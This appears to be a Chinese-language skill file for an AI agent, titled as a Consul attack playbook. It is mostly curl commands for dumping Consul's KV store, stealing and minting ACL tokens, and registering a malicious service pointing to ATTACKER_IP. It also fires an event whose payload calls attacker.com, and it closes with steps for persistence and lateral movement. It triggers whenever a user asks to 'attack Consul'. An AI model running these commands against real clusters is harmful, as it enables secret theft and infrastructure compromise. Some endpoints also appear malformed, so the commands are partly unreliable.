---
name: consul-attack
type: attack
category: service-discovery
platform: consul
severity: medium
---

# Consul 攻击技能

## 触发条件

- 发现 Consul 服务
- 可以访问 Consul API
- 用户要求"攻击 Consul"

## 前置检查

```bash
# 1. 测试连接
curl http://consul.example.com:8500/v1/status/leader

# 2. 检查版本
curl http://consul.example.com:8500/v1/agent/self
```

## 攻击方法

### 方法 1: KV 存储窃取

```bash
# 1. 列出所有键
curl http://consul.example.com:8500/v1/kv/keys?keys

# 2. 读取所有值
for key in $(curl -s http://consul.example.com:8500/v1/kv/keys?keys | jq -r '.[]'); do
    echo "=== $key ==="
    curl http://consul.example.com:8500/v1/kv/$key
    echo ""
done

# 3. 递归读取
curl http://consul.example.com:8500/v1/kv/?recurse
```

### 方法 2: 服务信息窃取

```bash
# 1. 列出所有服务
curl http://consul.example.com:8500/v1/catalog/services

# 2. 列出健康服务
curl http://consul.example.com:8500/v1/health/state/any

# 3. 获取服务详细信息
curl http://consul.example.com:8500/v1/catalog/service/SERVICE_NAME
```

### 方法 3: ACL Token 窃取

```bash
# 1. 列出所有 tokens
curl http://consul.example.com:8500/v1/acl/tokens

# 2. 创建管理 token
curl -X PUT \
  -H "X-Consul-Token: BOOTSTRAP_TOKEN" \
  http://consul.example.com:8500/v1/acl/token/master

# 3. 使用管理 token
CONSUL_TOKEN="..."
curl -H "X-Consul-Token: $CONSUL_TOKEN" \
  http://consul.example.com:8500/v1/kv/keys
```

### 方法 4: 配置注入

```bash
# 1. 修改服务配置
curl -X PUT \
  -H "X-Consul-Token: BOOTSTRAP_TOKEN" \
  -d '{"Service": {"Service": "malicious", "Address": "ATTACKER_IP", "Port": 4444}}' \
  http://consul.example.com:8500/v1/agent/service/register

# 2. 重启服务
# 服务会连接到攻击者服务器
```

### 方法 5: 事件流攻击

```bash
# 1. 监听事件
curl http://consul.example.com:8500/v1/event/fire/list

# 2. 注入恶意事件
curl -X PUT \
  -d '{"Name": "malicious", "Payload": "curl https://attacker.com/trigger"}' \
  http://consul.example.com:8500/v1/event/fire/fire
```

## 验证成功

```bash
# 成功读取 KV
curl http://consul.example.com:8500/v1/kv/password

# 成功获取服务信息
curl http://consul.example.com:8500/v1/catalog/services

# 成功创建 token
curl http://consul.example.com:8500/v1/acl/token/master
```

## 下一步

1. 使用窃取的凭证访问后端服务
2. 通过 Consul 持久化
3. 攻击其他服务网格组件
